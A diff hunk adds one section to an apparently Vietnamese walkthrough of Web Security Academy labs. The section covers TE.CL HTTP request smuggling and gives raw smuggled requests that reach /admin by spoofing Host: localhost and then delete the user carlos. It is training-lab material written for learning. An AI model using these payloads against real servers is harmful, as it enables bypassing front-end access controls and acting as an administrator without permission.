@@ -188,6 +188,60 @@ Host: 0aa800dc048c8579c2f33a540000004f.web-security-academy.net
 Như ta thấy, `Host` header thứ 2 đã được chuyển vào body nên không còn bị lỗi trùng header `Host` nữa. Sau khi submit, ta đến được trang `/admin`. Tiếp tục tương tự truy cập `/admin/delete?username=carlos`, kết quả thành công.
 
 # 7. Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+Thử submit request sau hai lần:
+```
+POST / HTTP/1.1
+Host: 0a60008904904433c0c631a900340080.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+1
+X
+0
+
+
+```
+Lần thứ hai hiển thị lỗi 404 Not Found. Như vậy website có lỗi TE.CL, nên back-end server đã coi ký tự `X` là 1 phần của request tiếp theo, dẫn đến method trở thành `XPOST` => Not Found
+
+Để exploit TE.CL vào trang `/admin` ta cấu hình request như sau:
+```
+POST / HTTP/1.1
+Host: 0a60008904904433c0c631a900340080.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+5e
+GET /admin HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+0
+
+
+```
+Ta đã access được đến `/admin` trên back-end server, tuy nhiên lại được trả về lỗi "Admin interface only available to local users". Ta sẽ fake localhost bằng cách thay đổi Host header.
+```
+POST / HTTP/1.1
+Host: 0a60008904904433c0c631a900340080.web-security-academy.net
+Content-Length: 4
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
+
+5e
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+0
+
+
+```
+Kết quả, truy cập trang admin thành công. Để xóa user carlos, ta submit request tương tự đến `/admin/delete?username=carlos`. Như vậy bài lab được giải.
 
 # 8. Exploiting HTTP request smuggling to reveal front-end request rewriting
 
